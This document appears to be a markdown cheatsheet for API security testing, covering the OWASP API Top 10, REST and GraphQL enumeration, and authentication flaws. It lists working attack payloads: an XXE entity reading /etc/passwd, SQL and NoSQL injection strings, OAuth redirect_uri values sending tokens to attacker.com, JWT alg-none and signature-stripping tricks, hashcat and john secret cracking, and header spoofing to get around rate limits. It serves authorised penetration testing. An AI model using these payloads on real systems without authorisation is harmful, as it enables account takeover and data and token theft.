# 🔌 API Security Testing Cheatsheet

```
   █████╗ ██████╗ ██╗    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
  ██╔══██╗██╔══██╗██║    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
  ███████║██████╔╝██║    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
  ██╔══██║██╔═══╝ ██║    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
  ██║  ██║██║     ██║    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
  ╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
```

<p align="center">
  <img src="https://img.shields.io/badge/API-Security-blue?style=for-the-badge" alt="API">
  <img src="https://img.shields.io/badge/REST-Testing-green?style=for-the-badge" alt="REST">
  <img src="https://img.shields.io/badge/GraphQL-red?style=for-the-badge" alt="GraphQL">
</p>

---

## 📋 Table of Contents

- [OWASP API Top 10](#-owasp-api-top-10)
- [REST API Testing](#-rest-api-testing)
- [GraphQL Testing](#-graphql-testing)
- [Authentication Attacks](#-authentication-attacks)
- [JWT Attacks](#-jwt-attacks)
- [Common Vulnerabilities](#-common-vulnerabilities)

---

## 🔴 OWASP API Top 10

| # | Vulnerability | Description |
|---|---------------|-------------|
| 1 | **BOLA** | Broken Object Level Authorization |
| 2 | **Broken Authentication** | Auth weaknesses |
| 3 | **BOPLA** | Broken Object Property Level Auth |
| 4 | **Unrestricted Resource Consumption** | No rate limiting |
| 5 | **BFLA** | Broken Function Level Authorization |
| 6 | **SSRF** | Server-Side Request Forgery |
| 7 | **Security Misconfiguration** | Default configs |
| 8 | **Lack of Protection** | Business flow |
| 9 | **Improper Assets Management** | Old APIs |
| 10 | **Unsafe API Consumption** | Third-party |

---

## 🌐 REST API Testing

### Discovery & Enumeration

```bash
# Find API endpoints
ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Version enumeration
/api/v1/users
/api/v2/users
/api/v3/users
/api/beta/users
/api/latest/users

# Common paths
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger/
/openapi.json
/api-docs
/swagger.json
/swagger-ui/
/docs/
```

### HTTP Methods Testing

```bash
# Test all methods
curl -X GET https://api.target.com/users/1
curl -X POST https://api.target.com/users
curl -X PUT https://api.target.com/users/1
curl -X PATCH https://api.target.com/users/1
curl -X DELETE https://api.target.com/users/1
curl -X OPTIONS https://api.target.com/users

# Method override
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://api.target.com/users/1
curl -X POST -H "X-Method-Override: PUT" https://api.target.com/users/1
```

### Parameter Manipulation

```bash
# BOLA/IDOR
GET /api/users/1      # Your ID
GET /api/users/2      # Another user's ID
GET /api/users/0
GET /api/users/-1
GET /api/users/999999

# Parameter pollution
/api/users?id=1&id=2
/api/users?id[]=1&id[]=2

# Encoding bypass
/api/users/1%00
/api/users/1%0a
/api/users/1%2e%2e%2f2
```

### Content-Type Attacks

```bash
# Change Content-Type
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: text/plain

# XXE via Content-Type
curl -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>'
```

### Mass Assignment

```bash
# Add extra fields
POST /api/users
{
  "username": "test",
  "email": "test@test.com",
  "role": "admin",           # Try adding
  "isAdmin": true,           # Try adding
  "balance": 99999,          # Try adding
  "verified": true           # Try adding
}

# Using arrays
{
  "user": {
    "name": "test",
    "role_ids": [1, 2, 3]
  }
}
```

---

## 📊 GraphQL Testing

### Introspection

```graphql
# Full introspection query
query {
  __schema {
    types {
      name
      fields {
        name
        args { name }
      }
    }
  }
}

# Simple introspection
{__schema{types{name,fields{name}}}}

# Get all queries
{__schema{queryType{fields{name,description}}}}

# Get all mutations
{__schema{mutationType{fields{name,description}}}}
```

### Common Attacks

```graphql
# IDOR
query { user(id: 2) { email, password } }

# Batching attack
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
}

# Nested query DoS
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          name
        }
      }
    }
  }
}

# Field suggestions
{ user { a }  # Will suggest valid fields
```

### SQL Injection in GraphQL

```graphql
# SQLi in arguments
query { user(name: "' OR '1'='1") { id } }
query { users(filter: "admin'--") { id } }

# NoSQL injection
query { user(query: "{$gt: ''}") { id } }
```

### Bypass Disabled Introspection

```graphql
# Alternative introspection
query { __type(name: "User") { fields { name } } }

# Field brute-forcing with ffuf
# Use wordlist of common GraphQL field names
```

---

## 🔐 Authentication Attacks

### API Key Testing

```bash
# Find API keys
# Check JS files, mobile apps, GitHub

# Test key in different places
curl -H "X-API-Key: KEY" https://api.target.com
curl -H "Authorization: Bearer KEY" https://api.target.com
curl -H "api-key: KEY" https://api.target.com
curl "https://api.target.com?api_key=KEY"
```

### OAuth/OAuth2 Attacks

```bash
# Token theft via redirect_uri
?redirect_uri=https://attacker.com
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com%40attacker.com
?redirect_uri=https://target.com/callback/../../../attacker

# State parameter bypass
# Remove state parameter
# Use same state for different users

# Token leakage
# Check Referer header for token leakage
```

### Session Management

```bash
# Token enumeration
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Old tokens still valid after logout?
# Token rotation issues
# Token reuse across sessions
```

---

## 🎫 JWT Attacks

### Decode JWT

```bash
# Online: jwt.io
# CLI
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```

### Algorithm Confusion

```bash
# Change alg to none
{
  "alg": "none",
  "typ": "JWT"
}
# Remove signature

# HS256 → RS256 attack
# Use public key as HMAC secret
```

### Signature Bypass

```bash
# Remove signature (keep dots)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.

# Weak secret brute-force
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Common weak secrets
secret
password
123456
your-256-bit-secret
```

### Claim Manipulation

```javascript
// Change user claims
{
  "sub": "1234567890",
  "name": "admin",        // Change to admin
  "role": "admin",        // Escalate role
  "admin": true,          // Add admin flag
  "exp": 9999999999       // Extend expiration
}
```

### JWT Tools

```bash
# jwt_tool
python3 jwt_tool.py <JWT>
python3 jwt_tool.py <JWT> -T    # Tamper
python3 jwt_tool.py <JWT> -C -d wordlist.txt  # Crack

# jwtcrack
./jwtcrack <JWT>
```

---

## 🐛 Common Vulnerabilities

### Rate Limiting Bypass

```bash
# Headers to try
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1

# Change case
X-FORWARDED-FOR: 127.0.0.1

# Null byte
X-Forwarded-For: 127.0.0.1%00

# Different endpoints
/api/login
/API/LOGIN
/api/Login
/api/login/
```

### BOLA (Broken Object Level Authorization)

```bash
# Test ID manipulation
GET /api/orders/123    # Your order
GET /api/orders/124    # Someone else's order

# UUID guessing
# Check for predictable patterns
# Try sequential, timestamp-based

# ID in different formats
/api/users/1
/api/users/001
/api/users/user_1
/api/users/0x1
```

### BFLA (Broken Function Level Authorization)

```bash
# Access admin endpoints as regular user
GET /api/admin/users
POST /api/admin/config
DELETE /api/admin/user/1

# Method-based
GET /api/users     # Allowed
POST /api/users    # Should be admin only?
DELETE /api/users  # Should be admin only?
```

### Improper Assets Management

```bash
# Old API versions
/api/v1/users    # May have more vulns
/api/v2/users    # Current
/api/v3/users    # Beta/unreleased

# Development endpoints
/api/debug/
/api/test/
/api/internal/
/api/dev/
```

---

## 🛠️ Tools

| Tool | Purpose |
|------|---------|
| **Burp Suite** | API interception & testing |
| **Postman** | API exploration |
| **Insomnia** | REST/GraphQL client |
| **graphql-voyager** | GraphQL visualization |
| **jwt_tool** | JWT testing |
| **Arjun** | Parameter discovery |

---

## 📚 Resources

- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [JWT.io](https://jwt.io/)

---

<p align="center">
  <b>🔌 Secure Your APIs!</b><br>
  <i>For authorized testing only!</i>
</p>
